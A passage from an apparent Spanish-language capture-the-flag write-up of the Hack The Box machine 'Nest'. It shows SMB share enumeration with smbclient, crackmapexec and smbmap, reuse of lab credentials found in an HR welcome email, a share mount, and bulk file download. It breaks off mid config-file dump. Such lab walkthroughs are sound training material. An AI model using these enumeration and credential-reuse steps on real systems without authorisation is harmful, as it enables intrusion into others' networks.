   7   │ IT department and use the credentials below <span class="k">until </span>all systems have been <span class="nb">set </span>up <span class="k">for </span>you.
   8   │ 
   9   │ Username: TempUser
  10   │ Password: welcome2019
  11   │ 
  12   │ 
  13   │ Thank you
  14   │ HR
</code></pre></div></div>

<p>Vemos unas credenciales de un usuario temporal; pero antes, vamos a checar el otro directorio.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.178/Users <span class="nt">-N</span>
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> recurse on
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sat Jan 25 17:04:21 2020
  ..                                  D        0  Sat Jan 25 17:04:21 2020
  Administrator                       D        0  Fri Aug  9 10:08:23 2019
  C.Smith                             D        0  Sun Jan 26 01:21:44 2020
  L.Frost                             D        0  Thu Aug  8 12:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 12:02:50 2019
  TempUser                            D        0  Wed Aug  7 17:55:56 2019

<span class="se">\A</span>dministrator
NT_STATUS_ACCESS_DENIED listing <span class="se">\A</span>dministrator<span class="se">\*</span>

<span class="se">\C</span>.Smith
NT_STATUS_ACCESS_DENIED listing <span class="se">\C</span>.Smith<span class="se">\*</span>

<span class="se">\L</span>.Frost
NT_STATUS_ACCESS_DENIED listing <span class="se">\L</span>.Frost<span class="se">\*</span>

<span class="se">\R</span>.Thompson
NT_STATUS_ACCESS_DENIED listing <span class="se">\R</span>.Thompson<span class="se">\*</span>

<span class="se">\T</span>empUser
NT_STATUS_ACCESS_DENIED listing <span class="se">\T</span>empUser<span class="se">\*</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<p>Como nos indica el correo del archivo <code class="language-plaintext highlighter-rouge">Welcome Email.txt</code>, bajo la ruta <code class="language-plaintext highlighter-rouge">/Users/</code> se encuentran los usuarios, en este caso son : <strong>Administrator</strong>, <strong>C.Smith</strong>, <strong>L.Frost</strong>, <strong>R.Thompson</strong> y <strong>TempUser</strong> y contamos con credenciales del último usuario, así que vamos a ingresar como el usuario <strong>TempUser</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.178 <span class="nt">-u</span> <span class="s1">'TempUser'</span> <span class="nt">-p</span> <span class="s1">'welcome2019'</span>
SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:HTB-NEST<span class="o">)</span> <span class="o">(</span>domain:HTB-NEST<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.178    445    HTB-NEST         <span class="o">[</span>+] HTB-NEST<span class="se">\T</span>empUser:welcome2019

❯ smbclient //10.10.10.178/Users <span class="nt">-U</span> <span class="s1">'TempUser'</span>
Enter WORKGROUP<span class="se">\T</span>empUser<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sat Jan 25 17:04:21 2020
  ..                                  D        0  Sat Jan 25 17:04:21 2020
  Administrator                       D        0  Fri Aug  9 10:08:23 2019
  C.Smith                             D        0  Sun Jan 26 01:21:44 2020
  L.Frost                             D        0  Thu Aug  8 12:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 12:02:50 2019
  TempUser                            D        0  Wed Aug  7 17:55:56 2019

                5242623 blocks of size 4096. 1840001 blocks available
smb: \&gt; 
</span></code></pre></div></div>

<p>Vamos a ingresar a la carpeta del usuario a ver que encontrarmos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>TempUser
smb: <span class="se">\T</span>empUser<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Aug  7 17:55:56 2019
  ..                                  D        0  Wed Aug  7 17:55:56 2019
  New Text Document.txt               A        0  Wed Aug  7 17:55:56 2019

                5242623 blocks of size 4096. 1840001 blocks available
smb: <span class="se">\T</span>empUser<span class="se">\&gt;</span>
</code></pre></div></div>

<p>Nos transferimos el archivo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\T</span>empUser<span class="se">\&gt;</span> get <span class="s2">"New Text Document.txt"</span>
getting file <span class="se">\T</span>empUser<span class="se">\N</span>ew Text Document.txt of size 0 as New Text Document.txt <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.0 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\T</span>empUser<span class="se">\&gt;</span>
</code></pre></div></div>

<p>Vemos que el archivo que se encuentra no tiene nada de información; asi que ahora podríamos ver si con dichas credenciales podemos ingresar a otro recurso del servicio SMB.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.178 <span class="nt">-u</span> <span class="s1">'TempUser'</span> <span class="nt">-p</span> <span class="s1">'welcome2019'</span>
<span class="o">[</span>+] IP: 10.10.10.178:445        Name: 10.10.10.178                                      
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC<span class="nv">$ </span>                                                   NO ACCESS       Remote IPC
        Secure<span class="nv">$ </span>                                                READ ONLY
        Users                                                   READ ONLY
</code></pre></div></div>

<p>Y vemos que tenemos permisos de sólo lectura en <strong>Secure$</strong>, así que vamos a echarle un ojo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.178/Secure<span class="se">\$</span> <span class="nt">-U</span> <span class="s1">'TempUser'</span>
Enter WORKGROUP<span class="se">\T</span>empUser<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Wed Aug  7 18:08:12 2019
  ..                                  D        0  Wed Aug  7 18:08:12 2019
  Finance                             D        0  Wed Aug  7 14:40:13 2019
  HR                                  D        0  Wed Aug  7 18:08:11 2019
  IT                                  D        0  Thu Aug  8 05:59:25 2019

                5242623 blocks of size 4096. 1840001 blocks available
smb: \&gt; recurse on
smb: \&gt; ls
  .                                   D        0  Wed Aug  7 18:08:12 2019
  ..                                  D        0  Wed Aug  7 18:08:12 2019
  Finance                             D        0  Wed Aug  7 14:40:13 2019
  HR                                  D        0  Wed Aug  7 18:08:11 2019
  IT                                  D        0  Thu Aug  8 05:59:25 2019

\Finance
NT_STATUS_ACCESS_DENIED listing \Finance\*

\HR
NT_STATUS_ACCESS_DENIED listing \HR\*

\IT
NT_STATUS_ACCESS_DENIED listing \IT\*
smb: \&gt;
</span></code></pre></div></div>

<p>Pues no tenemos nada de nada; sin embargo, podriamos pensar que como ya contamos con unas credenciales, tengamos otros permisos para el directorio <strong>Data</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.178/Data <span class="nt">-U</span> <span class="s1">'TempUser'</span>
Enter WORKGROUP<span class="se">\T</span>empUser<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; recurse on
smb: \&gt; ls                                                                                                                       
  .                                   D        0  Wed Aug  7 17:53:46 2019
  ..                                  D        0  Wed Aug  7 17:53:46 2019
  IT                                  D        0  Wed Aug  7 17:58:07 2019                                                       
  Production                          D        0  Mon Aug  5 16:53:38 2019
  Reports                             D        0  Mon Aug  5 16:53:44 2019
  Shared                              D        0  Wed Aug  7 14:07:51 2019                                                       
                                                                                                                                 
\IT                                                                                                                              
  .                                   D        0  Wed Aug  7 17:58:07 2019
  ..                                  D        0  Wed Aug  7 17:58:07 2019
  Archive                             D        0  Mon Aug  5 17:33:58 2019
  Configs                             D        0  Wed Aug  7 17:59:34 2019                                                       
  Installs                            D        0  Wed Aug  7 17:08:30 2019                                                       
  Reports                             D        0  Sat Jan 25 18:09:13 2020
  Tools                               D        0  Mon Aug  5 17:33:43 2019
                                                                                                                                 
\Production                                                                                                                      
  .                                   D        0  Mon Aug  5 16:53:38 2019
  ..                                  D        0  Mon Aug  5 16:53:38 2019
                                                                                                                                 
\Reports                                                                                                                         
  .                                   D        0  Mon Aug  5 16:53:44 2019
  ..                                  D        0  Mon Aug  5 16:53:44 2019
                                                                                                                                 
\Shared                                                                                                                          
  .                                   D        0  Wed Aug  7 14:07:51 2019
  ..                                  D        0  Wed Aug  7 14:07:51 2019                                                       
  Maintenance                         D        0  Wed Aug  7 14:07:32 2019                                                       
  Templates                           D        0  Wed Aug  7 14:08:07 2019
                                                                                                                                 
\IT\Archive                                                                                                                      
  .                                   D        0  Mon Aug  5 17:33:58 2019                                                       
  ..                                  D        0  Mon Aug  5 17:33:58 2019
                                                                                                                                 
\IT\Configs                     
  .                                   D        0  Wed Aug  7 17:59:34 2019                                                       
  ..                                  D        0  Wed Aug  7 17:59:34 2019
  Adobe                               D        0  Wed Aug  7 14:20:09 2019
  Atlas                               D        0  Tue Aug  6 06:16:18 2019
  DLink                               D        0  Tue Aug  6 08:25:27 2019                                                       
  Microsoft                           D        0  Wed Aug  7 14:23:26 2019
  NotepadPlusPlus                     D        0  Wed Aug  7 14:31:37 2019
  RU Scanner                          D        0  Wed Aug  7 15:01:13 2019
  Server Manager                      D        0  Tue Aug  6 08:25:19 2019

\IT\Installs                                                                                                                     
  .                                   D        0  Wed Aug  7 17:08:30 2019
  ..                                  D        0  Wed Aug  7 17:08:30 2019
                                                                                                                                 
\IT\Reports
  .                                   D        0  Sat Jan 25 18:09:13 2020
  ..                                  D        0  Sat Jan 25 18:09:13 2020

\IT\Tools
  .                                   D        0  Mon Aug  5 17:33:43 2019
  ..                                  D        0  Mon Aug  5 17:33:43 2019

\Shared\Maintenance
  .                                   D        0  Wed Aug  7 14:07:32 2019
  ..                                  D        0  Wed Aug  7 14:07:32 2019
  Maintenance Alerts.txt              A       48  Mon Aug  5 18:01:44 2019

\Shared\Templates
  .                                   D        0  Wed Aug  7 14:08:07 2019
  ..                                  D        0  Wed Aug  7 14:08:07 2019
  HR                                  D        0  Wed Aug  7 14:08:01 2019
  Marketing                           D        0  Wed Aug  7 14:08:06 2019

\IT\Configs\Adobe
  .                                   D        0  Wed Aug  7 14:20:09 2019
  ..                                  D        0  Wed Aug  7 14:20:09 2019
  editing.xml                        AH      246  Sat Aug  3 07:58:42 2019
  Options.txt                         A        0  Mon Oct 10 16:11:14 2011
  projects.xml                        A      258  Tue Jan  8 10:30:52 2013
  settings.xml                        A     1274  Wed Aug  7 14:19:12 2019

\IT\Configs\Atlas
  .                                   D        0  Tue Aug  6 06:16:18 2019
  ..                                  D        0  Tue Aug  6 06:16:18 2019
  Temp.XML                           An     1369  Wed Jun 11 02:38:22 2003

\IT\Configs\DLink
  .                                   D        0  Tue Aug  6 08:25:27 2019
  ..                                  D        0  Tue Aug  6 08:25:27 2019

\IT\Configs\Microsoft
  .                                   D        0  Wed Aug  7 14:23:26 2019
  ..                                  D        0  Wed Aug  7 14:23:26 2019
  Options.xml                         A     4598  Sat Mar  3 13:24:24 2012

\IT\Configs\NotepadPlusPlus
  .                                   D        0  Wed Aug  7 14:31:37 2019
  ..                                  D        0  Wed Aug  7 14:31:37 2019
  config.xml                          A     6451  Wed Aug  7 18:01:25 2019
  shortcuts.xml                       A     2108  Wed Aug  7 14:30:27 2019

\IT\Configs\RU Scanner
  .                                   D        0  Wed Aug  7 15:01:13 2019
  ..                                  D        0  Wed Aug  7 15:01:13 2019
  RU_config.xml                       A      270  Thu Aug  8 14:49:37 2019

\IT\Configs\Server Manager
  .                                   D        0  Tue Aug  6 08:25:19 2019
  ..                                  D        0  Tue Aug  6 08:25:19 2019

\Shared\Templates\HR
  .                                   D        0  Wed Aug  7 14:08:01 2019
  ..                                  D        0  Wed Aug  7 14:08:01 2019
  Welcome Email.txt                   A      425  Wed Aug  7 17:55:36 2019

\Shared\Templates\Marketing
  .                                   D        0  Wed Aug  7 14:08:06 2019
  ..                                  D        0  Wed Aug  7 14:08:06 2019

                5242623 blocks of size 4096. 1840001 blocks available
</span></code></pre></div></div>

<p>Tenemos que para el directorio <code class="language-plaintext highlighter-rouge">\IT\Configs</code> vemos varios archivos de extensión xml a los cuales tenemos acceso. Para trabajar un poco más cómodos, vamos a crearnos una montura:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mkdir</span> /mnt/smbmounted
❯ mount <span class="nt">-t</span> cifs //10.10.10.178/Data /mnt/smbmounted/ <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>TempUser,password<span class="o">=</span>welcome2019,domain<span class="o">=</span>WORKGROUP,rw
❯ <span class="nb">cd</span> /mnt/smbmounted
❯ tree
<span class="nb">.</span>
├── IT
│   ├── Archive
│   ├── Configs
│   │   ├── Adobe
│   │   │   ├── editing.xml
│   │   │   ├── Options.txt
│   │   │   ├── projects.xml
│   │   │   └── settings.xml
│   │   ├── Atlas
│   │   │   └── Temp.XML
│   │   ├── DLink
│   │   ├── Microsoft
│   │   │   └── Options.xml
│   │   ├── NotepadPlusPlus
│   │   │   ├── config.xml
│   │   │   └── shortcuts.xml
│   │   ├── RU Scanner
│   │   │   └── RU_config.xml
│   │   └── Server Manager
│   ├── Installs
│   ├── Reports
│   └── Tools
├── Production
├── Reports
└── Shared
    ├── Maintenance
    │   └── Maintenance Alerts.txt
    └── Templates
        ├── HR
        │   └── Welcome Email.txt
        └── Marketing

20 directories, 11 files
</code></pre></div></div>

<p>Ahora si vemos la información de una mejor forma, ahora vamos a transferiornos los archivos para echarles un ojo y para este caso utilizaremos <code class="language-plaintext highlighter-rouge">smbget</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbget <span class="nt">-R</span> smb://10.10.10.178/Data <span class="nt">-U</span> TempUser
Password <span class="k">for</span> <span class="o">[</span>TempUser] connecting to //Data/10.10.10.178: 
Using workgroup WORKGROUP, user TempUser
smb://10.10.10.178/Data/IT/Configs/Adobe/editing.xml                                                                             
smb://10.10.10.178/Data/IT/Configs/Adobe/Options.txt                                                                             
smb://10.10.10.178/Data/IT/Configs/Adobe/projects.xml                                                                            
smb://10.10.10.178/Data/IT/Configs/Adobe/settings.xml                                                                            
smb://10.10.10.178/Data/IT/Configs/Atlas/Temp.XML                                                                                
smb://10.10.10.178/Data/IT/Configs/Microsoft/Options.xml                                                                         
smb://10.10.10.178/Data/IT/Configs/NotepadPlusPlus/config.xml                                                                    
smb://10.10.10.178/Data/IT/Configs/NotepadPlusPlus/shortcuts.xml                                                                 
smb://10.10.10.178/Data/IT/Configs/RU Scanner/RU_config.xml                                                                      
smb://10.10.10.178/Data/Shared/Maintenance/Maintenance Alerts.txt                                                                
smb://10.10.10.178/Data/Shared/Templates/HR/Welcome Email.txt                                                                    
Downloaded 16.65kB <span class="k">in </span>25 seconds

❯ tree
<span class="nb">.</span>
├── credentials.txt
├── IT
│   ├── Archive
│   ├── Configs
│   │   ├── Adobe
│   │   │   ├── editing.xml
│   │   │   ├── Options.txt
│   │   │   ├── projects.xml
│   │   │   └── settings.xml
│   │   ├── Atlas
│   │   │   └── Temp.XML
│   │   ├── DLink
│   │   ├── Microsoft
│   │   │   └── Options.xml
│   │   ├── NotepadPlusPlus
│   │   │   ├── config.xml
│   │   │   └── shortcuts.xml
│   │   ├── RU Scanner
│   │   │   └── RU_config.xml
│   │   └── Server Manager
│   ├── Installs
│   ├── Reports
│   └── Tools
├── Maintenance Alerts.txt
├── New Text Document.txt
├── Production
├── Reports
├── Shared
│   ├── Maintenance
│   │   └── Maintenance Alerts.txt
│   └── Templates
│       ├── HR
│       │   └── Welcome Email.txt
│       └── Marketing
└── Welcome Email.txt

20 directories, 15 files
</code></pre></div></div>

<p>Vamos a echarles un ojo a los archivos que hacen referencia a configuración, en este caso son: <code class="language-plaintext highlighter-rouge">config.xml</code> y <code class="language-plaintext highlighter-rouge">RU_config.xml</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>config.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"Windows-1252"</span> ?&gt;
&lt;NotepadPlus&gt;
    &lt;GUIConfigs&gt;
        &lt;<span class="o">!</span><span class="nt">--</span> 3 status : <span class="s2">"large"</span>, <span class="s2">"small"</span> or <span class="s2">"hide"</span><span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"ToolBar"</span> <span class="nv">visible</span><span class="o">=</span><span class="s2">"yes"</span><span class="o">&gt;</span>standard&lt;/GUIConfig&gt;
        &lt;<span class="o">!</span><span class="nt">--</span> 2 status : <span class="s2">"show"</span> or <span class="s2">"hide"</span><span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"StatusBar"</span><span class="o">&gt;</span>show&lt;/GUIConfig&gt;
        &lt;<span class="o">!</span><span class="nt">--</span> For all attributs, 2 status : <span class="s2">"yes"</span> or <span class="s2">"no"</span><span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"TabBar"</span> <span class="nv">dragAndDrop</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">drawTopBar</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">drawInactiveTab</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">reduce</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">closeButton</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">doubleClick2Close</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">vertical</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">multiLine</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">hide</span><span class="o">=</span><span class="s2">"no"</span> /&gt;
        &lt;<span class="o">!</span><span class="nt">--</span> 2 positions : <span class="s2">"horizontal"</span> or <span class="s2">"vertical"</span><span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"ScintillaViewsSplitter"</span><span class="o">&gt;</span>vertical&lt;/GUIConfig&gt;
        &lt;<span class="o">!</span><span class="nt">--</span> For the attribut of position, 2 status : docked or undocked <span class="p">;</span> 2 status : <span class="s2">"show"</span> or <span class="s2">"hide"</span> <span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"UserDefineDlg"</span> <span class="nv">position</span><span class="o">=</span><span class="s2">"undocked"</span><span class="o">&gt;</span>hide&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"TabSetting"</span> <span class="nv">size</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">replaceBySpace</span><span class="o">=</span><span class="s2">"no"</span> /&gt;
        &lt;<span class="o">!</span><span class="nt">--App</span> position--&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"AppPosition"</span> <span class="nv">x</span><span class="o">=</span><span class="s2">"662"</span> <span class="nv">y</span><span class="o">=</span><span class="s2">"95"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"955"</span> <span class="nv">height</span><span class="o">=</span><span class="s2">"659"</span> <span class="nv">isMaximized</span><span class="o">=</span><span class="s2">"yes"</span> /&gt;
        &lt;<span class="o">!</span><span class="nt">--</span> For the primary scintilla view,
             2 status <span class="k">for </span>Attribut lineNumberMargin, bookMarkMargin, indentGuideLine and currentLineHilitingShow: <span class="s2">"show"</span> or <span class="s2">"hide"</span>
             4 status <span class="k">for </span>Attribut folderMarkStyle : <span class="s2">"simple"</span>, <span class="s2">"arrow"</span>, <span class="s2">"circle"</span> and <span class="s2">"box"</span>  <span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"ScintillaPrimaryView"</span> <span class="nv">lineNumberMargin</span><span class="o">=</span><span class="s2">"show"</span> <span class="nv">bookMarkMargin</span><span class="o">=</span><span class="s2">"show"</span> <span class="nv">folderMarkStyle</span><span class="o">=</span><span class="s2">"box"</span> <span class="nv">indentGuideLine</span><span class="o">=</span><span class="s2">"show"</span> <span class="nv">currentLineHilitingShow</span><span class="o">=</span><span class="s2">"show"</span> <span class="nv">Wrap</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">edge</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">edgeNbColumn</span><span class="o">=</span><span class="s2">"100"</span> <span class="nv">wrapSymbolShow</span><span class="o">=</span><span class="s2">"hide"</span> <span class="nv">zoom</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">whiteSpaceShow</span><span class="o">=</span><span class="s2">"hide"</span> <span class="nv">eolShow</span><span class="o">=</span><span class="s2">"hide"</span> <span class="nv">lineWrapMethod</span><span class="o">=</span><span class="s2">"aligned"</span> <span class="nv">zoom2</span><span class="o">=</span><span class="s2">"0"</span> /&gt;
        &lt;<span class="o">!</span><span class="nt">--</span> For the secodary scintilla view,
             2 status <span class="k">for </span>Attribut lineNumberMargin, bookMarkMargin, indentGuideLine and currentLineHilitingShow: <span class="s2">"show"</span> or <span class="s2">"hide"</span>
             4 status <span class="k">for </span>Attribut folderMarkStyle : <span class="s2">"simple"</span>, <span class="s2">"arrow"</span>, <span class="s2">"circle"</span> and <span class="s2">"box"</span> <span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"Auto-detection"</span><span class="o">&gt;</span><span class="nb">yes</span>&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"CheckHistoryFiles"</span><span class="o">&gt;</span>no&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"TrayIcon"</span><span class="o">&gt;</span>no&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"RememberLastSession"</span><span class="o">&gt;</span><span class="nb">yes</span>&lt;/GUIConfig&gt;
        &lt;<span class="o">!</span><span class="nt">--</span>
			New Document default settings :
				format <span class="o">=</span> 0/1/2 -&gt; win/unix/mac
				encoding <span class="o">=</span> 0/1/2/3/4/5 -&gt; ANSI/UCS2Big/UCS2small/UTF8/UTF8-BOM
				defaultLang <span class="o">=</span> 0/1/2/..

			Note 1 : UTF8-BOM -&gt; UTF8 without BOM
			Note 2 : <span class="k">for </span>defaultLang :
					0 -&gt; L_TXT
					1 -&gt; L_PHP
					... <span class="o">(</span>see <span class="nb">source </span>file<span class="o">)</span>
		<span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"NewDocDefaultSettings"</span> <span class="nv">format</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">codepage</span><span class="o">=</span><span class="s2">"-1"</span> <span class="nv">openAnsiAsUTF8</span><span class="o">=</span><span class="s2">"no"</span> /&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"langsExcluded"</span> <span class="nv">gr0</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">gr1</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">gr2</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">gr3</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">gr4</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">gr5</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">gr6</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">gr7</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">langMenuCompact</span><span class="o">=</span><span class="s2">"yes"</span> /&gt;
        &lt;<span class="o">!</span><span class="nt">--</span>
		printOption is print colour setting, the following values are possible :
			0 : WYSIWYG
			1 : Invert colour
			2 : B &amp; W
			3 : WYSIWYG but without background colour
		<span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"Print"</span> <span class="nv">lineNumber</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">printOption</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">headerLeft</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>FULL_CURRENT_PATH<span class="si">)</span><span class="s2">"</span> <span class="nv">headerMiddle</span><span class="o">=</span><span class="s2">""</span> <span class="nv">headerRight</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>LONG_DATE<span class="si">)</span><span class="s2"> </span><span class="si">$(</span>TIME<span class="si">)</span><span class="s2">"</span> <span class="nv">headerFontName</span><span class="o">=</span><span class="s2">"IBMPC"</span> <span class="nv">headerFontStyle</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">headerFontSize</span><span class="o">=</span><span class="s2">"8"</span> <span class="nv">footerLeft</span><span class="o">=</span><span class="s2">""</span> <span class="nv">footerMiddle</span><span class="o">=</span><span class="s2">"-</span><span class="si">$(</span>CURRENT_PRINTING_PAGE<span class="si">)</span><span class="s2">-"</span> <span class="nv">footerRight</span><span class="o">=</span><span class="s2">""</span> <span class="nv">footerFontName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">footerFontStyle</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">footerFontSize</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">margeLeft</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">margeTop</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">margeRight</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">margeBottom</span><span class="o">=</span><span class="s2">"0"</span> /&gt;
        &lt;<span class="o">!</span><span class="nt">--</span>
                            Backup Setting :
                                0 : non backup
                                1 : simple backup
                                2 : verbose backup
                      <span class="nt">--</span><span class="o">&gt;</span>
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"Backup"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">useCustumDir</span><span class="o">=</span><span class="s2">"no"</span> <span class="nb">dir</span><span class="o">=</span><span class="s2">""</span> /&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"TaskList"</span><span class="o">&gt;</span><span class="nb">yes</span>&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"SaveOpenFileInSameDir"</span><span class="o">&gt;</span>no&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"noUpdate"</span> <span class="nv">intervalDays</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">nextUpdateDate</span><span class="o">=</span><span class="s2">"20080426"</span><span class="o">&gt;</span>no&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"MaitainIndent"</span><span class="o">&gt;</span><span class="nb">yes</span>&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"MRU"</span><span class="o">&gt;</span><span class="nb">yes</span>&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"URL"</span><span class="o">&gt;</span>0&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"globalOverride"</span> <span class="nb">fg</span><span class="o">=</span><span class="s2">"no"</span> <span class="nb">bg</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">font</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">fontSize</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">bold</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">italic</span><span class="o">=</span><span class="s2">"no"</span> <span class="nv">underline</span><span class="o">=</span><span class="s2">"no"</span> /&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"auto-completion"</span> <span class="nv">autoCAction</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">triggerFromNbChar</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">funcParams</span><span class="o">=</span><span class="s2">"no"</span> /&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"sessionExt"</span><span class="o">&gt;</span>&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"SmartHighLight"</span><span class="o">&gt;</span><span class="nb">yes</span>&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"TagsMatchHighLight"</span> <span class="nv">TagAttrHighLight</span><span class="o">=</span><span class="s2">"yes"</span> <span class="nv">HighLightNonHtmlZone</span><span class="o">=</span><span class="s2">"no"</span><span class="o">&gt;</span><span class="nb">yes</span>&lt;/GUIConfig&gt;
        &lt;GUIConfig <span class="nv">name</span><span class="o">=</span><span class="s2">"MenuBar"</span><span class="o">&gt;</span>show&lt;/GUIConfig&gt;
